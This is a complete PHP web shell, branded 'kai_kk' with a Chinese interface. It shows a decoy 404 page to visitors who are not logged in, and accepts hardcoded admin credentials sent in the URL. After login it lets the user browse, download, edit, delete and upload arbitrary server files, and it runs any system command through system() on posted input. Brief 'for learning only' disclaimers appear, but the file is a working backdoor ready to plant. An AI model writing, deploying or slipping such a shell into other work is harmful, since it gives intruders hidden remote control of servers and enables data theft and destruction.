<?php
session_start();
$username = 'admin'; // 预设用户名
$password = 'admin@123'; // 预设密码

function authenticate() {
    global $username, $password;

    if (isset($_GET['username']) && isset($_GET['password'])) {
        if ($_GET['username'] === $username && $_GET['password'] === $password) {
            $_SESSION['auth'] = true;
            // 重定向移除URL中的敏感参数
            header("Location: ?");
            exit;
        }
    }

    if (isset($_GET['logout'])) {
        session_destroy();
        header("Location: ?");
        exit;
    }

    if (empty($_SESSION['auth'])) {
        show_404();
        exit;
    }
}

function show_404() {
    echo <<<HTML
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body { 
            background: #f0f0f0; 
            font-family: Arial, sans-serif; 
            text-align: center;
            padding: 50px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
        }
        h1 {
            color: #dc3545;
            font-size: 72px;
            margin-bottom: 20px;
        }
        .instructions {
            margin-top: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 5px;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>404</h1>
        <h2>页面未找到</h2>
        <p>您请求的页面不存在或已被移除。</p>
    </div>
</body>
</html>
HTML;
    exit;
}

function show_404_2()
{
    echo <<<HTML
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>页面未找到 - 404错误</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow-x: hidden;
        }

        .container {
            width: 100%;
            max-width: 1000px;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.25);
            overflow: hidden;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .header {
            background: linear-gradient(to right, #6a11cb, #2575fc);
            color: white;
            text-align: center;
            padding: 30px 20px;
            position: relative;
        }

        .header h1 {
            font-size: 4.5rem;
            font-weight: 800;
            margin-bottom: 10px;
            text-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
        }

        .header p {
            font-size: 1.5rem;
            opacity: 0.9;
            max-width: 600px;
            margin: 0 auto;
        }

        .content {
            display: flex;
            padding: 40px;
            flex-wrap: wrap;
        }

        .illustration {
            flex: 1;
            min-width: 300px;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .robot {
            position: relative;
            width: 220px;
            height: 300px;
        }

        .robot-head {
            width: 160px;
            height: 160px;
            background: #4e54c8;
            border-radius: 50%;
            position: relative;
            margin: 0 auto;
            overflow: hidden;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
        }

        .robot-face {
            width: 120px;
            height: 80px;
            background: white;
            border-radius: 50%;
            position: absolute;
            top: 40px;
            left: 20px;
            display: flex;
            justify-content: space-around;
            align-items: center;
            padding: 0 15px;
        }

        .eye {
            width: 25px;
            height: 25px;
            background: #4e54c8;
            border-radius: 50%;
            animation: blink 4s infinite;
        }

        @keyframes blink {
            0%, 45%, 55%, 100% { height: 25px; }
            50% { height: 5px; }
        }

        .robot-body {
            width: 180px;
            height: 140px;
            background: #4e54c8;
            border-radius: 20px;
            position: absolute;
            top: 140px;
            left: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
        }

        .panel {
            width: 140px;
            height: 100px;
            background: #6a75e0;
            border-radius: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 2.5rem;
            color: white;
            font-weight: bold;
        }

        .info {
            flex: 1;
            min-width: 300px;
            padding: 20px;
        }

        .info h2 {
            color: #4e54c8;
            font-size: 2.2rem;
            margin-bottom: 20px;
        }

        .info p {
            color: #555;
            font-size: 1.1rem;
            line-height: 1.7;
            margin-bottom: 25px;
        }

        .features {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin: 25px 0;
        }

        .feature {
            flex: 1;
            min-width: 200px;
            background: #f0f5ff;
            border-radius: 12px;
            padding: 15px;
            display: flex;
            align-items: center;
        }

        .feature i {
            font-size: 1.8rem;
            color: #4e54c8;
            margin-right: 15px;
            width: 40px;
            text-align: center;
        }

        .feature-content h3 {
            color: #333;
            margin-bottom: 5px;
        }

        .feature-content p {
            font-size: 0.95rem;
            margin: 0;
            color: #777;
        }

        .actions {
            display: flex;
            gap: 15px;
            margin-top: 20px;
            flex-wrap: wrap;
        }

        .btn {
            padding: 14px 30px;
            border-radius: 50px;
            font-weight: 600;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
            font-size: 1rem;
            cursor: pointer;
            border: none;
        }

        .btn-primary {
            background: linear-gradient(to right, #6a11cb, #2575fc);
            color: white;
            box-shadow: 0 5px 15px rgba(106, 17, 203, 0.4);
        }

        .btn-outline {
            background: transparent;
            border: 2px solid #6a11cb;
            color: #6a11cb;
        }

        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(106, 17, 203, 0.5);
        }

        .btn i {
            margin-right: 8px;
        }

        .footer {
            text-align: center;
            padding: 25px;
            background: #f8f9ff;
            color: #777;
            font-size: 0.95rem;
        }

        .decoration {
            position: absolute;
            width: 200px;
            height: 200px;
            border-radius: 50%;
            background: rgba(106, 17, 203, 0.1);
            top: -100px;
            right: -100px;
        }

        .decoration-2 {
            width: 150px;
            height: 150px;
            background: rgba(37, 117, 252, 0.1);
            bottom: -75px;
            left: -75px;
        }

        .search-box {
            background: white;
            border-radius: 50px;
            padding: 8px 20px;
            display: flex;
            align-items: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            margin: 20px 0;
            max-width: 500px;
        }

        .search-box input {
            flex: 1;
            border: none;
            padding: 12px;
            font-size: 1rem;
            outline: none;
        }

        .search-box button {
            background: linear-gradient(to right, #6a11cb, #2575fc);
            color: white;
            border: none;
            border-radius: 50px;
            padding: 10px 25px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .search-box button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 10px rgba(106, 17, 203, 0.4);
        }

        @media (max-width: 768px) {
            .content {
                flex-direction: column;
                padding: 20px;
            }

            .header h1 {
                font-size: 3.5rem;
            }

            .header p {
                font-size: 1.2rem;
            }

            .actions {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="decoration"></div>
    <div class="decoration decoration-2"></div>

    <div class="header">
        <h1>404</h1>
        <p>哎呀！您访问的页面不存在或已被移除</p>
    </div>

    <div class="content">
        <div class="illustration">
            <div class="robot">
                <div class="robot-head">
                    <div class="robot-face">
                        <div class="eye"></div>
                        <div class="eye"></div>
                    </div>
                </div>
                <div class="robot-body">
                    <div class="panel">404</div>
                </div>
            </div>
        </div>

        <div class="info">
            <h2>页面未找到</h2>
            <p>您正在寻找的页面可能已被删除、名称已更改或暂时不可用。请检查URL是否正确，或使用下面的搜索功能查找您需要的内容。</p>

            <div class="search-box">
                <input type="text" placeholder="搜索网站内容...">
                <button>搜索</button>
            </div>

            <div class="features">
                <div class="feature">
                    <i class="fas fa-link"></i>
                    <div class="feature-content">
                        <h3>URL不正确</h3>
                        <p>请检查地址栏中的URL拼写</p>
                    </div>
                </div>

                <div class="feature">
                    <i class="fas fa-history"></i>
                    <div class="feature-content">
                        <h3>页面已移动</h3>
                        <p>您寻找的内容可能已被转移</p>
                    </div>
                </div>
            </div>

            <p>您还可以尝试以下操作：</p>

            <div class="actions">
                <a href="#" class="btn btn-primary">
                    <i class="fas fa-home"></i> 返回首页
                </a>
                <a href="#" class="btn btn-outline">
                    <i class="fas fa-arrow-left"></i> 返回上一页
                </a>
                <a href="#" class="btn btn-outline">
                    <i class="fas fa-envelope"></i> 联系支持
                </a>
            </div>
        </div>
    </div>

    <div class="footer">
        <p>© 202X 公司名称 | 隐私政策 | 使用条款</p>
    </div>
</div>

<script>
    // 添加简单的动画效果
    document.addEventListener('DOMContentLoaded', function() {
        const elements = document.querySelectorAll('.header, .illustration, .info');

        elements.forEach((el, index) => {
            setTimeout(() => {
                el.style.opacity = '1';
                el.style.transform = 'translateY(0)';
            }, index * 200);
        });

        // 为按钮添加悬停效果
        const buttons = document.querySelectorAll('.btn');
        buttons.forEach(btn => {
            btn.addEventListener('mouseenter', () => {
                btn.style.transform = 'translateY(-3px)';
            });

            btn.addEventListener('mouseleave', () => {
                btn.style.transform = 'translateY(0)';
            });
        });
    });
</script>
</body>
</html>


HTML;
    exit;



}


// 以下功能代码保持不变（已省略）
// 文件下载、删除、编辑等功能代码保持不变
// ...

// 认证检查
authenticate();

if (isset($_GET['download'])) {
    $file = realpath($_GET['download']);
    if ($file && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
        exit;
    }
}

// 文件删除处理
if (isset($_GET['delete'])) {
    $file = realpath($_GET['delete']);
    if ($file && is_file($file)) {
        if (unlink($file)) {
            echo '<div class="container"><div class="alert alert-success">文件删除成功！</div></div>';
        } else {
            echo '<div class="container"><div class="alert alert-danger">文件删除失败！请检查权限</div></div>';
        }
    } else {
        echo '<div class="container"><div class="alert alert-warning">文件不存在或路径非法！</div></div>';
    }
}

// 文件编辑器功能（新增函数）
function show_editor($filePath) {
    $file = realpath($filePath);
    if (!$file || !is_file($file)) {
        echo '<div class="container"><div class="alert alert-danger">文件不存在！</div></div>';
        return;
    }

    // 处理保存请求
    $content = file_get_contents($file);
    if (isset($_POST['save'])) {
        $newContent = $_POST['content'];
        if (is_writable($file)) {
            if (file_put_contents($file, $newContent) !== false) {
                echo '<div class="container"><div class="alert alert-success">✔️ 文件保存成功</div></div>';
                $content = $newContent; // 更新显示内容
            } else {
                echo '<div class="container"><div class="alert alert-danger">❌ 文件保存失败！请检查磁盘空间</div></div>';
            }
        } else {
            echo '<div class="container"><div class="alert alert-danger">❌ 文件不可写！请检查权限</div></div>';
        }
    }

    // 显示编辑器界面
    echo <<<HTML
<div class="container mt-4">
    <div class="card shadow-sm">
        <div class="card-header">
            📝 编辑文件: <code>{$file}</code>
            <a href="?" class="btn btn-sm btn-secondary float-end">返回</a>
        </div>
        <div class="card-body">
            <form method="post">
                <div class="mb-3">
                    <textarea 
                        name="content" 
                        class="form-control font-monospace" 
                        rows="20"
                        style="font-size: 14px; tab-size: 4;"
                    >{$content}</textarea>
                </div>
                <button type="submit" name="save" class="btn btn-primary">
                    💾 保存更改
                </button>
            </form>
        </div>
    </div>
</div>
HTML;
}


// 命令执行处理（增强版）
function execute_command($cmd) {
    system($cmd);

}

function handle_file_upload($current_dir) {
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $target_dir = realpath($current_dir);
        $target_file = $target_dir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);

        // 检查文件是否已存在
        if (file_exists($target_file)) {
            return '<div class="container"><div class="alert alert-warning">文件已存在！</div></div>';
        }

        // 尝试移动上传的文件
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            return '<div class="container"><div class="alert alert-success">文件上传成功！</div></div>';
        } else {
            return '<div class="container"><div class="alert alert-danger">文件上传失败！</div></div>';
        }
    }
    return '';
}

/*========== 界面组件 ==========*/
function show_login() {
    echo <<<HTML
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>shell</title>
    <link href="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.1.3/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #f8f9fa; height: 100vh; }
        .login-box {
            max-width: 400px;
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body class="d-flex align-items-center">
    <div class="container">
        <div class="login-box bg-white mx-auto">
            <h2 class="text-center mb-4">🔐 kai_kk</h2>
            <form method="post">
                <div class="mb-3">
                    <input type="password" name="password" 
                           class="form-control form-control-lg" 
                           placeholder="输入密码" required>
                </div>
                <button name="login" class="btn btn-primary btn-lg w-100">
                    登录shell
                </button>
                <p class="text-center mt-3">仅供学习与交流，禁止用于非法用途。</p> 
            </form>
        </div>
    </div>
</body>
</html>
HTML;
}

function show_header() {
    echo <<<HTML
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>file manager</title>
    <link href="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.1.3/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .file-icon { font-size: 1.2em; margin-right: 8px; }
        .action-btns .btn { margin: 2px; }
        pre { 
            background: #f8f9fa; 
            padding: 15px; 
            border-radius: 5px;
            max-height: 60vh;
            overflow: auto;
            white-space: pre-wrap;
        }
    </style>
</head>
<body class="bg-light">
<nav class="navbar navbar-dark bg-dark mb-4">
    <div class="container">
        <a class="navbar-brand" href="?">📁 kai_kk</a>
        <a href="?logout" class="btn btn-outline-light">退出系统</a>
    </div>
</nav>
HTML;
}

function show_file_manager($dir = '.') {
    $current_path = realpath($dir);
    $parent_dir = dirname($current_path);

    echo '<div class="container">';

    // 路径导航
    echo '<div class="mb-3">';
    echo '<a href="?path='.urlencode($parent_dir).'" class="btn btn-sm btn-outline-secondary">← 上级目录</a>';
    echo '<span class="ms-3 text-muted">当前位置：'.htmlspecialchars($current_path).'</span>';
    echo '</div>';

    // 文件表格
    echo '<div class="card shadow-sm">';
    echo '<div class="card-body p-0">';
    echo '<table class="table table-hover mb-0">';
    echo '<thead class="bg-light"><tr>
            <th>名称</th>
            <th>类型</th>
            <th>大小</th>
            <th>修改时间</th>
            <th width="200">操作</th>
          </tr></thead>';
    echo '<tbody>';

    foreach (scandir($current_path) as $file) {
        if ($file == '.' || $file == '..') continue;
        $full_path = $current_path.DIRECTORY_SEPARATOR.$file;
        $is_dir = is_dir($full_path);

        echo '<tr>';
        // 名称列
        echo '<td>';
        if($is_dir) {
            echo '<a href="?path='.urlencode($full_path).'" class="text-decoration-none">';
            echo '📁 ';
            echo htmlspecialchars($file);
            echo '</a>';
        } else {
            echo '📄 ';
            echo htmlspecialchars($file);
        }
        echo '</td>';

        // 类型列
        echo '<td>'.($is_dir ? '文件夹' : '文件').'</td>';

        // 大小列
        echo '<td>'.format_size($is_dir ? 0 : filesize($full_path)).'</td>';

        // 修改时间
        echo '<td>'.date("Y-m-d H:i", filemtime($full_path)).'</td>';

        // 操作列
        echo '<td class="action-btns">';
        if (!$is_dir) {
            echo '<a href="?edit='.urlencode($full_path).'" class="btn btn-sm btn-outline-primary">编辑</a>';
            echo '<a href="?download='.urlencode($full_path).'" class="btn btn-sm btn-outline-success">下载</a>';
            echo '<a href="?delete='.urlencode($full_path).'" 
                   onclick="return confirm(\'确认删除？\')" 
                   class="btn btn-sm btn-outline-danger">删除</a>';
        }
        echo '</td></tr>';
    }

    echo '</tbody></table></div></div>'; // 结束卡片和表格

    // 功能面板
    show_tools_panel($current_path);
}

function show_tools_panel($current_path) {
    echo '<div class="row mt-4">';

    // 上传面板
    echo '<div class="col-md-6 mb-4">';
    echo '<div class="card shadow-sm">';
    echo '<div class="card-header">📤 文件上传</div>';
    echo '<div class="card-body">';
    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="file" name="file" class="form-control mb-3" required>';
    echo '<button class="btn btn-primary w-100">上传文件</button>';
    echo '</form>';
    echo '</div></div></div>';

    // 命令面板（增强版）
    echo '<div class="col-md-6 mb-4">';
    echo '<div class="card shadow-sm">';
    echo '<div class="card-header">💻 命令执行</div>';
    echo '<div class="card-body">';
    echo '<form method="post">';
    echo '<input type="text" name="cmd" 
           placeholder="输入系统命令" 
           class="form-control mb-3"
           value="'.htmlspecialchars($_POST['cmd'] ?? '').'">';
    echo '<button class="btn btn-warning w-100">执行命令</button>';
    echo '</form>';
    if (!empty($_POST['cmd'])) {
        echo '<div class="mt-3">'.execute_command($_POST['cmd']).'</div>';
    }
    echo '</div></div></div>';

    echo '</div>'; // 结束row
}

/*========== 工具函数 ==========*/
function format_size($size) {
    $units = ['B', 'KB', 'MB', 'GB'];
    for ($i = 0; $size >= 1024 && $i < 3; $i++) $size /= 1024;
    return round($size, 2).' '.$units[$i];
}

/*========== 主流程 ==========*/
authenticate();

show_header();

// 处理操作请求
$current_dir = isset($_GET['path']) ? $_GET['path'] : '.';

$upload_result = handle_file_upload($current_dir);
echo $upload_result;

// 显示内容
if (isset($_GET['edit'])) {
    show_editor($_GET['edit']);
} else {
    show_file_manager($current_dir);
}
echo '<p> 仅供学习，勿用于非法用途。</p>';

echo '</body></html>';